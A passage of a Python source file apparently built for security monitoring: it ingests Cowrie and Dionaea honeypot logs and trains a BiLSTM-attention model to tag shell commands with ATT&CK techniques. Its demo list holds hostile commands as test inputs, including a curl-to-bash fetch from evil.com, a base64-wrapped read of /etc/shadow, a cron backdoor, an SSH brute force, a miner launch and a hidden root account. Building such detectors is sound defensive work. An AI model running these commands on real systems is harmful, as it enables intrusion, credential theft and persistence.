        print(f"  📥 Cowrie: {len(df):,} events ← {log_path}")
        return df

    def ingest_dionaea(self, log_path: str) -> pd.DataFrame:
        """
        Supports:
          - Dionaea SQLite DBs (.sqlite/.db/.sqlite3)
          - Dionaea JSONL logs (e.g., attack_logs.json)
        """
        path = Path(log_path)
        if not path.exists():
            print(f"  [WARN] Dionaea log not found: {log_path}")
            return pd.DataFrame()

        records = []
        suffix = path.suffix.lower()

        # SQLite ingestion
        if suffix in {'.sqlite', '.db', '.sqlite3'}:
            try:
                conn = sqlite3.connect(str(path))
                cur = conn.cursor()
                cur.execute("SELECT name FROM sqlite_master WHERE type='table'")
                tables = {r[0] for r in cur.fetchall()}

                if 'downloads' in tables:
                    cur.execute("SELECT url, md5hash, filelength FROM downloads LIMIT 5000")
                    for url, md5, size in cur.fetchall():
                        if not url:
                            continue
                        cmd = self._canonicalize(
                            f"file_download url_fetch {url} save {md5 or 'payload'}"
                        )
                        labels = list(dict.fromkeys(
                            self._triage(cmd) + ['T1105_Ingress_Tool_Transfer']))
                        records.append({
                            'command': cmd,
                            'features': extract_soc_features(cmd),
                            'label': labels,
                            'source': 'dionaea',
                            'timestamp': '',
                            'src_ip': '',
                        })

                if 'connections' in tables:
                    cur.execute("""SELECT remote_host, remote_port, protocol
                                   FROM connections WHERE remote_host IS NOT NULL
                                   LIMIT 5000""")
                    for host, port, proto in cur.fetchall():
                        svc = self._service_name(port)
                        cmd = self._canonicalize(
                            f"connection_event protocol={proto or 'tcp'} "
                            f"service={svc} dport={port} remote={host}"
                        )
                        records.append({
                            'command': cmd,
                            'features': extract_soc_features(cmd),
                            'label': self._triage(cmd),
                            'source': 'dionaea_conn',
                            'timestamp': '',
                            'src_ip': host or '',
                        })
                conn.close()
            except sqlite3.Error as e:
                print(f"  [WARN] Dionaea DB error: {e}")

        # JSONL ingestion (attack_logs.json style)
        else:
            with open(path, 'r', errors='replace') as fh:
                for line in fh:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        entry = json.loads(line)
                    except json.JSONDecodeError:
                        continue

                    src_ip = entry.get('src_ip', '') or ''
                    dst_port = entry.get('dst_port', '')
                    timestamp = entry.get('timestamp', '')
                    cmd = None
                    labels = None

                    if isinstance(entry.get('download'), dict):
                        url = (entry.get('download', {}).get('url', '') or '').strip()
                        if url:
                            cmd = self._canonicalize(
                                f"file_download url_fetch {url} save payload"
                            )
                            labels = list(dict.fromkeys(
                                self._triage(cmd) + ['T1105_Ingress_Tool_Transfer']))

                    if cmd is None and isinstance(entry.get('credentials'), dict):
                        usernames = entry.get('credentials', {}).get('username', []) or []
                        passwords = entry.get('credentials', {}).get('password', []) or []
                        u = usernames[0] if usernames else 'user'
                        p = passwords[0] if passwords else 'pass'
                        cmd = self._canonicalize(
                            f"ftp_login credential_attempt user={u} pass={p}"
                        )
                        labels = list(dict.fromkeys(
                            self._triage(cmd) + ['T1078_Valid_Accounts']))

                    if cmd is None and src_ip and dst_port:
                        proto = ''
                        if isinstance(entry.get('connection'), dict):
                            proto = entry.get('connection', {}).get('protocol', '') or ''
                        svc = self._service_name(dst_port)
                        cmd = self._canonicalize(
                            f"connection_event protocol={proto or 'tcp'} "
                            f"service={svc} dport={dst_port} remote={src_ip}"
                        )
                        labels = self._triage(cmd)

                    if not cmd:
                        continue

                    records.append({
                        'command': cmd,
                        'features': extract_soc_features(cmd),
                        'label': labels if labels else self._triage(cmd),
                        'source': 'dionaea_json',
                        'timestamp': timestamp,
                        'src_ip': src_ip,
                    })

        df = pd.DataFrame(records)
        print(f"  [INFO] Dionaea: {len(df):,} events <- {log_path}")
        return df

    def ingest_all(self, cowrie_logs=None, dionaea_dbs=None) -> pd.DataFrame:
        frames = []
        if cowrie_logs:
            for p in cowrie_logs:
                frames.append(self.ingest_cowrie(p))
        if dionaea_dbs:
            for p in dionaea_dbs:
                frames.append(self.ingest_dionaea(p))
        if not frames:
            print("  ℹ️  No real logs provided.")
            return pd.DataFrame()
        df = pd.concat(frames, ignore_index=True).dropna(subset=['command'])
        print(f"\n  ✅ Total real-log records: {len(df):,}")
        return df


# ============================================================
# MERGED HYBRID MODEL — BiLSTM + MultiHeadAttention  (v3)
# ============================================================
class HybridTTPClassifierV3:

    def __init__(self,
                 max_vocab_size      = 15000,
                 max_sequence_length = 100,   # longer for chained commands
                 embedding_dim       = 128,
                 num_features        = NUM_FEATURES):
        self.max_vocab_size      = max_vocab_size
        self.max_sequence_length = max_sequence_length
        self.embedding_dim       = embedding_dim
        self.num_features        = num_features
        self.tokenizer           = build_tokenizer(max_vocab_size)
        self.label_encoder       = MultiLabelBinarizer()
        self.model               = None
        self.history             = None
        self.per_class_thresholds= None

    def _preprocess(self, cmd) -> str:
        return str(cmd).lower().strip()

    def _pad(self, texts):
        seqs = self.tokenizer.texts_to_sequences(texts)
        return pad_sequences(seqs, maxlen=self.max_sequence_length, padding='post')

    # ── Model: BiLSTM → MultiHeadAttention → GAP ────────────
    def build_model(self, num_classes: int) -> models.Model:
        # TEXT BRANCH
        text_input = layers.Input(shape=(self.max_sequence_length,), name='text_input')
        x = layers.Embedding(self.max_vocab_size, self.embedding_dim,
                              mask_zero=True)(text_input)
        x = layers.SpatialDropout1D(0.2)(x)

        # BiLSTM with return_sequences=True so attention sees every timestep.
        # recurrent_dropout removed: on CPU TensorFlow it disables the cuDNN
        # kernel and forces a slow Python loop — input dropout=0.2 is sufficient.
        x = layers.Bidirectional(
                layers.LSTM(64, dropout=0.2,
                            return_sequences=True))(x)         # (batch, T, 128)

        # Multi-head self-attention — lets the model focus on suspicious tokens
        x = layers.MultiHeadAttention(num_heads=4, key_dim=32,
                                      dropout=0.1)(x, x)      # (batch, T, 128)
        x = layers.LayerNormalization()(x)
        x = layers.GlobalAveragePooling1D()(x)                 # (batch, 128)

        # SOC FEATURE BRANCH
        feat_input = layers.Input(shape=(self.num_features,), name='feature_input')
        f = layers.Dense(32, activation='relu')(feat_input)
        f = layers.BatchNormalization()(f)
        f = layers.Dense(16, activation='relu')(f)

        # MERGE + CLASSIFIER HEAD
        merged = layers.concatenate([x, f])
        out    = layers.Dense(128, activation='relu')(merged)
        out    = layers.Dropout(0.3)(out)
        out    = layers.Dense(64,  activation='relu')(out)
        out    = layers.Dropout(0.2)(out)
        output = layers.Dense(num_classes, activation='sigmoid')(out)

        model = models.Model(inputs=[text_input, feat_input], outputs=output)
        model.compile(
            optimizer = Adam(learning_rate=0.001),
            loss      = focal_loss(gamma=2.0, alpha=0.25),
            metrics   = [
                BinaryAccuracy(name='accuracy'),
                # PR-AUC is far more informative than accuracy under
                # multi-label class imbalance — it penalises confident
                # wrong predictions on rare classes
                tf.keras.metrics.AUC(
                    curve='PR', multi_label=True, name='pr_auc'),
            ],
        )
        return model

    # ── Training ─────────────────────────────────────────────
    def train(self, df: pd.DataFrame,
              epochs=50, batch_size=64, validation_split=0.15,
              ood_df=None):
        """
        3-way split:  train (70%) | calibration (15%) | test (15%)

        Why not a simple random split:
        After add_noise(), the DataFrame contains many near-duplicate
        commands (same base template, different wrappers).  A random split
        places noisy variants of the same command in both train and val,
        inflating metrics.  We prevent this by grouping on the *normalised
        base command* before splitting so all variants of one base stay
        on the same side of every split boundary.
        """
        print("\n" + "=" * 60)
        print("PREPARING TRAINING DATA")
        print("=" * 60)

        # ── [2] Grouped split — derive base command key ──────
        # Strip common wrappers added by add_noise() to recover the
        # approximate base command, then group by that key.
        def _base_key(cmd: str) -> str:
            s = str(cmd).lower().strip()
            # unwrap: nohup ... &
            s = re.sub(r'^nohup\s+', '', s)
            s = re.sub(r'\s+&\s*$', '', s)
            # unwrap: bash -c "..."
            s = re.sub(r'^bash\s+-c\s+"(.+)"$', r'\1', s)
            # unwrap: time ...
            s = re.sub(r'^time\s+', '', s)
            # unwrap: sudo ...
            s = re.sub(r'^sudo\s+', '', s)
            # unwrap: base64 pipe wrappers
            s = re.sub(r"^echo\s+'[A-Za-z0-9+/=]+'\s*\|\s*base64\s+-d\s*\|\s*bash$",
                       '__b64_wrapped__', s)
            # collapse double-spaces left by spacing variation
            s = re.sub(r'\s{2,}', ' ', s)
            # drop chained suffix (everything after first && / ; / |)
            s = re.split(r'\s*&&\s*|\s*;\s*|\s*\|\s*', s)[0].strip()
            return s

        df = df.copy()
        df['_base_key'] = df['command'].apply(_base_key)

        # Unique base keys → assign to train / calibration / test groups
        unique_keys = df['_base_key'].unique()
        np.random.shuffle(unique_keys)
        n = len(unique_keys)

        # ── [4] Small-dataset guard ──────────────────────────
        # Need at least 3 groups so every split (train/cal/test) gets ≥1.
        if n < 3:
            raise ValueError(
                f"Too few unique base-command groups ({n}) to create "
                "train / calibration / test splits. "
                "Generate more data or lower samples_per_technique."
            )

        # ── [3] validation_split now actually drives group sizes ─
        # validation_split controls the fraction going to EACH of
        # calibration and test.  Both are capped so train always
        # keeps at least one group (max holdout = 90 % combined).
        frac      = min(max(float(validation_split), 0.05), 0.45)
        n_cal     = max(1, int(n * frac))
        n_te      = max(1, int(n * frac))
        # Ensure train is never empty
        n_cal     = min(n_cal, n - 2)
        n_te      = min(n_te,  n - n_cal - 1)

        cal_keys  = set(unique_keys[:n_cal])
        test_keys = set(unique_keys[n_cal: n_cal + n_te])
        # everything else → train

        mask_cal  = df['_base_key'].isin(cal_keys)
        mask_test = df['_base_key'].isin(test_keys)
        mask_train= ~(mask_cal | mask_test)

        df_train = df[mask_train].reset_index(drop=True)
        df_cal   = df[mask_cal].reset_index(drop=True)
        df_test  = df[mask_test].reset_index(drop=True)

        print(f"✓ Classes       : {len(self.label_encoder.classes_) if hasattr(self.label_encoder, 'classes_') else 'TBD'}")
        print(f"✓ Train samples : {len(df_train):,}  "
              f"({len(df_train['_base_key'].unique()):,} unique base commands)")
        print(f"✓ Calib samples : {len(df_cal):,}")
        print(f"✓ Test  samples : {len(df_test):,}")

        def _extract(frame):
            cmds  = [self._preprocess(c) for c in frame['command']]
            feats = np.array(frame['features'].tolist(), dtype=np.float32)
            lbls  = self.label_encoder.fit_transform(frame['label'].tolist()) \
                    if frame is df_train \
                    else self.label_encoder.transform(frame['label'].tolist())
            return cmds, feats, lbls

        # Fit label encoder on train only
        tr_cmds  = [self._preprocess(c) for c in df_train['command']]
        tr_feats = np.array(df_train['features'].tolist(), dtype=np.float32)
        tr_lbls  = self.label_encoder.fit_transform(df_train['label'].tolist())
        n_classes = len(self.label_encoder.classes_)
        print(f"✓ Classes (fit)  : {n_classes}")

        def _transform(frame):
            cmds  = [self._preprocess(c) for c in frame['command']]
            feats = np.array(frame['features'].tolist(), dtype=np.float32)
            # filter out labels unseen during training
            safe_lbls = frame['label'].apply(
                lambda ls: [l for l in ls if l in set(self.label_encoder.classes_)]
                           or ['BENIGN'])
            lbls = self.label_encoder.transform(safe_lbls.tolist())
            return cmds, feats, lbls

        cal_cmds,  cal_feats,  cal_lbls  = _transform(df_cal)
        test_cmds, test_feats, test_lbls = _transform(df_test)

        print("🔤 Fitting tokenizer on train split only …")
        self.tokenizer.fit_on_texts(tr_cmds)

        tr_pad   = self._pad(tr_cmds)
        cal_pad  = self._pad(cal_cmds)
        test_pad = self._pad(test_cmds)

        print("🏗️  Building model (BiLSTM + MultiHeadAttention) …")
        self.model = self.build_model(n_classes)
        self.model.summary()

        # Early stopping monitors val PR-AUC (more reliable than accuracy
        # under label imbalance)
        cbs = [
            callbacks.EarlyStopping(
                monitor='val_pr_auc', patience=10,
                restore_best_weights=True, mode='max', verbose=1),
            callbacks.ReduceLROnPlateau(
                monitor='val_loss', factor=0.5,
                patience=5, min_lr=1e-6, verbose=1),
        ]

        print(f"\n🚀 TRAINING ({epochs} epochs, batch={batch_size}) …")
        t0 = datetime.now()
        self.history = self.model.fit(
            [tr_pad, tr_feats], tr_lbls,
            # ── validate on calibration set (not the final test set) ──
            validation_data=([cal_pad, cal_feats], cal_lbls),
            epochs=epochs, batch_size=batch_size,
            callbacks=cbs, verbose=1,
        )
        elapsed = (datetime.now() - t0).total_seconds() / 60
        print(f"\n✅ Training time: {elapsed:.1f} minutes")
        self._report_overfitting_signals(self.history)

        # ── [4] Threshold tuning on calibration set ──────────
        # The calibration set was used for early stopping but NOT for
        # weight updates — so tuning thresholds here is legitimate.
        # The final test set remains completely unseen until the report below.
        print("\n" + "=" * 60)
        print("PER-CLASS THRESHOLD TUNING  (calibration set)")
        print("=" * 60)
        cal_probs = self.model.predict([cal_pad, cal_feats], verbose=0)
        self.per_class_thresholds = self._tune_thresholds(
            cal_lbls, cal_probs, n_classes)

        # ── [3] Final evaluation on held-out test set ─────────
        # Test set has never been seen by the model or threshold tuner
        print("\n" + "=" * 60)
        print("FINAL EVALUATION  (held-out test set — unseen)")
        print("=" * 60)
        cal_metrics = self._evaluate(
            cal_pad, cal_feats, cal_lbls, label='Calibration (held-out)')
        test_metrics = self._evaluate(
            test_pad, test_feats, test_lbls, label='Test (unseen)')
        self._compare_calibration_vs_test(cal_metrics, test_metrics)

        # ── [5] Source-balanced evaluation ───────────────────
        if 'source' in df_test.columns:
            self._evaluate_by_source(
                df_test, test_pad, test_feats, test_lbls)

        if ood_df is not None and len(ood_df) > 0:
            self._evaluate_ood(ood_df)

        return self.history

    def _evaluate(self, X_pad, X_feat, y_true, label='Test'):
        """
        Full multi-label evaluation:
          - Hamming loss
          - Micro F1  (treats every label-sample pair equally — good overall signal)
          - Macro F1  (unweighted average across classes — surfaces rare class failures)
          - Per-class PR-AUC  (precision-recall area, best single metric for imbalanced multilabel)
        """
        from sklearn.metrics import (average_precision_score,
                                     precision_score, recall_score)

        y_probs = self.model.predict([X_pad, X_feat], verbose=0)

        # Use per-class tuned thresholds when available.
        # Falls back to 0.5 only before threshold tuning has run
        # (e.g. the calibration-set pass that happens during train()).
        if self.per_class_thresholds:
            y_pred = np.zeros_like(y_probs, dtype=int)
            for i, t in enumerate(self.per_class_thresholds):
                y_pred[:, i] = (y_probs[:, i] >= t).astype(int)
        else:
            y_pred = (y_probs >= 0.5).astype(int)

        h_loss    = hamming_loss(y_true, y_pred)
        micro_f1  = f1_score(y_true, y_pred, average='micro',  zero_division=0)
        macro_f1  = f1_score(y_true, y_pred, average='macro',  zero_division=0)
        micro_pr  = precision_score(y_true, y_pred, average='micro', zero_division=0)
        micro_rec = recall_score(y_true, y_pred,    average='micro', zero_division=0)

        # Per-class PR-AUC (area under precision-recall curve)
        try:
            pr_auc_per_class = average_precision_score(
                y_true, y_probs, average=None)
            mean_pr_auc = np.nanmean(pr_auc_per_class)
        except Exception:
            pr_auc_per_class = None
            mean_pr_auc = float('nan')

        print(f"\n── {label} ──────────────────────────────")
        print(f"   Hamming Loss      : {h_loss:.4f}   (lower is better)")
        print(f"   Micro F1          : {micro_f1:.4f}")
        print(f"   Macro F1          : {macro_f1:.4f}   (rare-class sensitive)")
        print(f"   Micro Precision   : {micro_pr:.4f}")
        print(f"   Micro Recall      : {micro_rec:.4f}")
        print(f"   Mean PR-AUC       : {mean_pr_auc:.4f}   (best imbalance indicator)")

        if pr_auc_per_class is not None:
            print("\n   Per-class PR-AUC:")
            for i, auc_val in enumerate(pr_auc_per_class):
                bar  = '█' * int(auc_val * 20)
                flag = '  ⚠️  low' if auc_val < 0.5 else ''
                print(f"   {self.label_encoder.classes_[i]:<45} "
                      f"{bar:<20} {auc_val:.3f}{flag}")
        return {
            'y_probs': y_probs,
            'hamming_loss': float(h_loss),
            'micro_f1': float(micro_f1),
            'macro_f1': float(macro_f1),
            'micro_precision': float(micro_pr),
            'micro_recall': float(micro_rec),
            'mean_pr_auc': float(mean_pr_auc),
        }

    def _report_overfitting_signals(self, history):
        """
        Basic overfitting diagnostics from train/validation curves.
        Uses the best validation PR-AUC epoch as the reference point.
        """
        hist = history.history
        if 'val_pr_auc' not in hist or 'pr_auc' not in hist:
            print("\n[Overfit Check] PR-AUC history not available.")
            return

        val_curve = np.array(hist['val_pr_auc'], dtype=np.float32)
        tr_curve  = np.array(hist['pr_auc'], dtype=np.float32)
        best_idx  = int(np.nanargmax(val_curve))
        best_ep   = best_idx + 1

        best_val_pr = float(val_curve[best_idx])
        best_tr_pr  = float(tr_curve[best_idx])
        pr_gap      = best_tr_pr - best_val_pr

        val_loss = float(hist['val_loss'][best_idx]) if 'val_loss' in hist else float('nan')
        tr_loss  = float(hist['loss'][best_idx]) if 'loss' in hist else float('nan')
        loss_gap = val_loss - tr_loss

        print("\n" + "=" * 60)
        print("OVERFITTING CHECK (curve-based)")
        print("=" * 60)
        print(f"   Best epoch (val PR-AUC): {best_ep}")
        print(f"   Train PR-AUC @best      : {best_tr_pr:.4f}")
        print(f"   Val   PR-AUC @best      : {best_val_pr:.4f}")
        print(f"   PR-AUC gap (train-val)  : {pr_gap:.4f}")
        print(f"   Loss gap (val-train)    : {loss_gap:.4f}")

        if pr_gap > 0.12 or loss_gap > 0.35:
            print("   ⚠️  Overfitting risk detected: train/val gap is high.")
            print("   ↳ Consider fewer epochs, stronger dropout, or more real logs.")
        else:
            print("   ✅ No strong overfitting signal from training curves.")

    def _compare_calibration_vs_test(self, cal_metrics: dict, test_metrics: dict):
        """
        Compare calibration and unseen test performance.
        Large drop from calibration -> test often indicates overfitting
        to calibration distributions.
        """
        cal_macro = float(cal_metrics.get('macro_f1', 0.0))
        tst_macro = float(test_metrics.get('macro_f1', 0.0))
        cal_pr    = float(cal_metrics.get('mean_pr_auc', 0.0))
        tst_pr    = float(test_metrics.get('mean_pr_auc', 0.0))

        d_macro = cal_macro - tst_macro
        d_pr    = cal_pr - tst_pr

        print("\n" + "=" * 60)
        print("GENERALIZATION CHECK (calibration vs test)")
        print("=" * 60)
        print(f"   Macro-F1 drop (cal->test): {d_macro:.4f}")
        print(f"   PR-AUC   drop (cal->test): {d_pr:.4f}")
        print(f"   Test Macro-F1             : {tst_macro:.4f}")
        print(f"   Test Mean PR-AUC          : {tst_pr:.4f}")

        if d_macro > 0.10 or d_pr > 0.10:
            print("   ⚠️  Generalization drop is notable. Monitor for overfitting.")
        else:
            print("   ✅ Calibration and test are reasonably aligned.")

        # Absolute-quality guardrail (not just relative drop).
        if tst_macro < 0.15 or tst_pr < 0.20:
            print("   ⚠️  Absolute test quality is low. Model not ready for deployment.")

    def _tune_thresholds(self, y_true, y_probs, n_classes):
        best = []
        for i in range(n_classes):
            bt, bf = 0.5, 0.0
            for t in np.arange(0.2, 0.81, 0.05):
                preds = (y_probs[:, i] >= t).astype(int)
                f1    = f1_score(y_true[:, i], preds, zero_division=0)
                if f1 > bf:
                    bf, bt = f1, t
            best.append(round(float(bt), 2))
            print(f"   {self.label_encoder.classes_[i]:<45} "
                  f"threshold={bt:.2f}  F1={bf:.3f}")
        print("✅ Thresholds saved.")
        return best

    def _evaluate_by_source(self, df_test, test_pad, test_feats, test_lbls):
        """
        [5] Source-balanced evaluation.
        Breaks the test-set report down by data source (synthetic / cowrie /
        dionaea) so you can see clearly whether the model is fitting on
        synthetic templates or generalising to real traffic.
        """
        from sklearn.metrics import average_precision_score

        print("\n── Source-Balanced Evaluation ───────────────────")
        y_probs = self.model.predict([test_pad, test_feats], verbose=0)

        sources = df_test['source'].unique()
        for src in sorted(sources):
            idx    = df_test.index[df_test['source'] == src].tolist()
            # re-index relative to test split
            rel    = [i for i, orig in enumerate(df_test.index) if orig in set(idx)]
            if not rel:
                continue
            y_t = test_lbls[rel]
            # Use per-class tuned thresholds for consistency with predict()
            if self.per_class_thresholds:
                y_p = np.zeros((len(rel), y_probs.shape[1]), dtype=int)
                for i, t in enumerate(self.per_class_thresholds):
                    y_p[:, i] = (y_probs[rel, i] >= t).astype(int)
            else:
                y_p = (y_probs[rel] >= 0.5).astype(int)
            try:
                pr = average_precision_score(y_t, y_probs[rel],
                                             average='macro')
            except Exception:
                pr = float('nan')
            mf1 = f1_score(y_t, y_p, average='macro', zero_division=0)
            hl  = hamming_loss(y_t, y_p)
            print(f"   [{src:<14}]  n={len(rel):>4}   "
                  f"Hamming={hl:.4f}   Macro-F1={mf1:.4f}   "
                  f"PR-AUC={pr:.4f}")
        print()

    def _evaluate_ood(self, ood_df: pd.DataFrame):
        from sklearn.metrics import average_precision_score
        print("\n" + "=" * 60)
        print("OOD EVALUATION (REAL LOGS — never seen during training)")
        print("=" * 60)
        known  = set(self.label_encoder.classes_)
        ood_df = ood_df.copy()
        ood_df['label'] = ood_df['label'].apply(
            lambda lbls: [l for l in lbls if l in known] or ['BENIGN'])
        ood_df = ood_df[ood_df['label'].apply(len) > 0]
        if len(ood_df) == 0:
            print("  ⚠️  No OOD samples with known labels.")
            return
        cmds   = [self._preprocess(c) for c in ood_df['command']]
        feats  = np.array(ood_df['features'].tolist(), dtype=np.float32)
        y_true = self.label_encoder.transform(ood_df['label'].tolist())
        y_prob = self.model.predict([self._pad(cmds), feats], verbose=0)

        # Apply per-class tuned thresholds (same as predict() and _evaluate()).
        # Using hardcoded 0.5 here was a bug — it discarded all threshold-tuning
        # work and artificially lowered the OOD F1 score.
        y_pred = np.zeros_like(y_prob, dtype=int)
        for i in range(len(self.label_encoder.classes_)):
            t = (self.per_class_thresholds[i]
                 if self.per_class_thresholds else 0.5)
            y_pred[:, i] = (y_prob[:, i] >= t).astype(int)

        mf1  = f1_score(y_true, y_pred, average='macro',  zero_division=0)
        mif1 = f1_score(y_true, y_pred, average='micro',  zero_division=0)
        hl   = hamming_loss(y_true, y_pred)
        try:
            pr = average_precision_score(y_true, y_prob, average='macro')
        except Exception:
            pr = float('nan')

        print(f"   Hamming Loss : {hl:.4f}")
        print(f"   Micro F1     : {mif1:.4f}")
        print(f"   Macro F1     : {mf1:.4f}")
        print(f"   PR-AUC (mac) : {pr:.4f}")
        print("   ↑ OOD numbers are the honest real-world estimate.")

    # ── Inference ────────────────────────────────────────────
    def predict(self, command: str, confidence_threshold=None) -> list:
        cmd   = self._preprocess(command)
        X_pad = self._pad([cmd])
        X_feat= np.array([extract_soc_features(command)], dtype=np.float32)
        probs = self.model.predict([X_pad, X_feat], verbose=0)[0]

        results = []
        for i, prob in enumerate(probs):
            thresh = (self.per_class_thresholds[i]
                      if self.per_class_thresholds and confidence_threshold is None
                      else (confidence_threshold or 0.5))
            if prob >= thresh:
                results.append((self.label_encoder.classes_[i], float(prob)))

        results.sort(key=lambda x: x[1], reverse=True)
        return results if results else [("BENIGN_OR_UNKNOWN", 0.0)]

    # ── Persistence ──────────────────────────────────────────
    def save(self, name=MODEL_NAME):
        self.model.save(f'{name}.keras')
        with open(f'{name}_components.pkl', 'wb') as fh:
            pickle.dump({
                'tokenizer':            self.tokenizer,
                'label_encoder':        self.label_encoder,
                'max_sequence_length':  self.max_sequence_length,
                'num_features':         self.num_features,
                'per_class_thresholds': self.per_class_thresholds,
                'version':              VERSION,
            }, fh)
        print(f"\n💾 Saved: {name}.keras + {name}_components.pkl")

    @classmethod
    def load(cls, name: str):
        """
        Load a saved model robustly.

        Why compile=False + manual recompile:
        Keras serialises the loss by its __name__ attribute.  If the saved
        name (e.g. 'focal_loss_g2.0_a0.25') doesn't exactly match the key
        passed to custom_objects the model either errors or silently falls
        back to a wrong loss.  Loading with compile=False skips that lookup
        entirely, then we recompile with the same focal_loss so the model
        is fully ready for fine-tuning or continued evaluation.
        """
        with open(f'{name}_components.pkl', 'rb') as fh:
            comp = pickle.load(fh)
        inst = cls(
            max_sequence_length = comp['max_sequence_length'],
            num_features        = comp['num_features'],
        )
        inst.tokenizer            = comp['tokenizer']
        inst.label_encoder        = comp['label_encoder']
        inst.per_class_thresholds = comp.get('per_class_thresholds')

        # Load weights only — no loss-name lookup required
        inst.model = models.load_model(f'{name}.keras', compile=False)

        # Recompile with the same loss used during training
        inst.model.compile(
            optimizer = Adam(learning_rate=0.001),
            loss      = focal_loss(gamma=2.0, alpha=0.25),
            metrics   = [
                BinaryAccuracy(name='accuracy'),
                tf.keras.metrics.AUC(
                    curve='PR', multi_label=True, name='pr_auc'),
            ],
        )
        print(f"✅ Loaded & recompiled: {name}  "
              f"(version {comp.get('version','?')})")
        return inst


# ============================================================
# TRAINING HISTORY PLOT
# ============================================================
def plot_history(history, name=MODEL_NAME):
    has_pr = 'pr_auc' in history.history

    ncols = 3 if has_pr else 2
    fig, axes = plt.subplots(1, ncols, figsize=(6 * ncols, 5))

    axes[0].plot(history.history['loss'],     label='Train')
    axes[0].plot(history.history['val_loss'], label='Val')
    axes[0].set_title('Focal Loss')
    axes[0].set_xlabel('Epoch')
    axes[0].legend()

    axes[1].plot(history.history['accuracy'],     label='Train')
    axes[1].plot(history.history['val_accuracy'], label='Val')
    axes[1].set_title('Binary Accuracy')
    axes[1].set_xlabel('Epoch')
    axes[1].legend()

    if has_pr:
        axes[2].plot(history.history['pr_auc'],     label='Train')
        axes[2].plot(history.history['val_pr_auc'], label='Val')
        axes[2].set_title('PR-AUC (multi-label)')
        axes[2].set_xlabel('Epoch')
        axes[2].legend()

    plt.suptitle(f'Training — {name}', fontsize=13)
    plt.tight_layout()
    out = f'{name}_history.png'
    plt.savefig(out, dpi=150)
    plt.close()
    print(f"📊 Saved: {out}")


# ============================================================
# DEMO TEST COMMANDS
# ============================================================
DEMO_COMMANDS = [
    "echo 'Y2F0IC9ldGMvc2hhZG93' | base64 -d | bash",
    "nmap -sV -p 22,80,443 --script=vuln 10.0.0.0/24",
    "curl -sL http://evil.com/shell.sh | bash",
    "(crontab -l; echo '* * * * * /tmp/backdoor.sh') | crontab -",
    "ls -la /var/log && df -h",
    "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100",
    "nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &",
    "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost",
]


# ============================================================
# MAIN
# ============================================================
def main():
    # ── Configure your real log paths here ──────────────────

    # Auto-detect local files used in your current setup.
    # Optional overrides:
    #   COWRIE_LOGS="cowrie.json,other_cowrie.json"
    #   DIONAEA_LOGS="attack_logs.json,dionaea.sqlite"
    cowrie_env = os.getenv("COWRIE_LOGS", "")
    dionaea_env = os.getenv("DIONAEA_LOGS", "")

    if cowrie_env.strip():
        COWRIE_LOGS = [p.strip() for p in cowrie_env.split(",") if p.strip()]
    else:
        COWRIE_LOGS = [p for p in ["cowrie.json"] if Path(p).exists()]

    if dionaea_env.strip():
        DIONAEA_DBS = [p.strip() for p in dionaea_env.split(",") if p.strip()]
    else:
        DIONAEA_DBS = [
            p for p in ["attack_logs.json", "dionaea.sqlite", "dionaea.db"]
            if Path(p).exists()
        ]
    # ── Step 1: Ingest real logs ─────────────────────────────
    print("\n" + "=" * 80)
    print("STEP 1: REAL LOG INGESTION")
    print("=" * 80)
    ingester = RealLogIngester()
    real_df  = ingester.ingest_all(COWRIE_LOGS, DIONAEA_DBS)
    ood_df   = None

    # ── Step 2: Generate synthetic data ─────────────────────
    print("\n" + "=" * 80)
    print("STEP 2: SYNTHETIC DATASET")
    print("=" * 80)
    generator = FinalDatasetGenerator()
    synth_df  = generator.generate_dataset(
        samples_per_technique=int(os.getenv("SYNTH_SAMPLES_PER_TECH", "180")),
        benign_multiplier=float(os.getenv("SYNTH_BENIGN_MULT", "1.8")))
    synth_df.to_csv(f'{MODEL_NAME}_training_data.csv', index=False)

    # Mix real logs into training (default 80 % train / 20 % OOD test)
    if len(real_df) > 0:
        real_train = real_df.sample(
            frac=float(os.getenv("REAL_TRAIN_FRAC", "0.8")), random_state=42)
        ood_df     = real_df.drop(real_train.index).reset_index(drop=True)
        target_real_share = float(os.getenv("TARGET_REAL_FRACTION", "0.30"))
        required_real = int(
            (target_real_share / max(1e-6, (1.0 - target_real_share))) * len(synth_df)
        )
        if 0 < len(real_train) < required_real:
            real_train = real_train.sample(
                n=required_real, replace=True, random_state=42
            ).reset_index(drop=True)

        train_df   = (pd.concat([synth_df, real_train], ignore_index=True)
                        .sample(frac=1, random_state=42)
                        .reset_index(drop=True))
        print(f"\n✅ Combined: {len(train_df):,} "
              f"({len(synth_df):,} synthetic + {len(real_train):,} real)")
    else:
        train_df = synth_df

    # ── Step 3: Train ────────────────────────────────────────
    print("\n" + "=" * 80)
    print("STEP 3: TRAINING  (BiLSTM + MultiHeadAttention + Focal Loss)")
    print("=" * 80)
    classifier = HybridTTPClassifierV3(
        max_vocab_size      = 10000,
        max_sequence_length = 100,
        embedding_dim       = 96,
        num_features        = NUM_FEATURES,
    )
    history = classifier.train(
        df               = train_df,
        epochs           = 50,
        batch_size       = 64,
        validation_split = 0.15,
        ood_df           = ood_df,
    )

    # ── Step 4: Save ─────────────────────────────────────────
    classifier.save(MODEL_NAME)

    # ── Step 5: Plot ─────────────────────────────────────────
    plot_history(history, MODEL_NAME)

    # ── Step 6: Demo predictions ─────────────────────────────
    print("\n" + "=" * 80)
    print("STEP 6: DEMO PREDICTIONS")
    print("=" * 80)
    for cmd in DEMO_COMMANDS:
        preds = classifier.predict(cmd)
        print(f"\n  CMD : {cmd[:85]}")
        for label, conf in preds:
            bar = '█' * int(conf * 20)
            print(f"  ▶  {label:<45} {bar}  {conf:.3f}")

    print("\n" + "=" * 80)
    print(f"✅ DONE — {MODEL_NAME}")
    print("=" * 80)


if __name__ == "__main__":
    main()

